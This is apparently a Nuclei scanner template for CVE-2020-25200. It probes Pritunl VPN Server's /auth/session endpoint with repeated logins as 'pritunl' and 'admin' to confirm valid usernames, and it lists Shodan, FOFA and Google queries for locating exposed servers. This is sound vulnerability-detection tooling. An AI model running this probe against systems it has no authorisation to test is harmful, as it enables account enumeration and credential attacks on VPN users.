http:
- attack: pitchfork
  matchers:
  - condition: and
    dsl:
    - status_code == 400
    - contains_any(body, "Too many authentication attempts", "auth_too_many")
    - contains(header, "application/json")
    type: dsl
  matchers-condition: and
  payloads:
    attempt:
    - '1'
    - '2'
    - '3'
    - '4'
    - '5'
    - '6'
    - '7'
    - '8'
    - '9'
    - '10'
    - '11'
    - '12'
    - '13'
    - '14'
    - '15'
    - '16'
    - '17'
    - '18'
    - '19'
    - '20'
    - '21'
    - '22'
    - '23'
    - '24'
    - '25'
    username:
    - pritunl
    - admin
  raw:
  - 'POST /auth/session HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json

    Origin: {{RootURL}}

    Referer: {{RootURL}}/login


    {"username":"{{username}}","password":"{{rand_int(10000,99999)}}"}

    '
  stop-at-first-match: true
id: CVE-2020-25200
info:
  author: pussycat0x
  classification:
    cpe: cpe:2.3:a:pritunl:pritunl:1.29.2145.25:*:*:*:*:*:*:*
    cve-id: CVE-2020-25200
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cwe-id: CWE-203
    epss-percentile: 0.97907
    epss-score: 0.55305
  description: 'Pritunl 1.29.2145.25 contains a username enumeration issue caused
    by different error responses in /auth/session login attempts, letting attackers
    verify valid usernames, exploit requires network access to the login endpoint.

    '
  impact: 'Attackers can enumerate valid VPN usernames, potentially aiding targeted
    attacks or credential stuffing efforts.

    '
  metadata:
    fofa-query: title="pritunl"
    google-query: intitle:"pritunl"
    max-request: 25
    product: pritunl
    shodan-query: http.title:"pritunl"
    vendor: pritunl
    verified: true
  name: Pritunl VPN Server 1.29.2145.25 - Username Enumeration
  reference:
  - https://github.com/lukaszstu/pritunl-CVE-2020-25200/blob/master/CVE-2020-25200
  remediation: 'Implement uniform error responses for login attempts to prevent username
    enumeration.

    '
  severity: medium
  tags: cve,cve2020,pritunl,vpn,enum
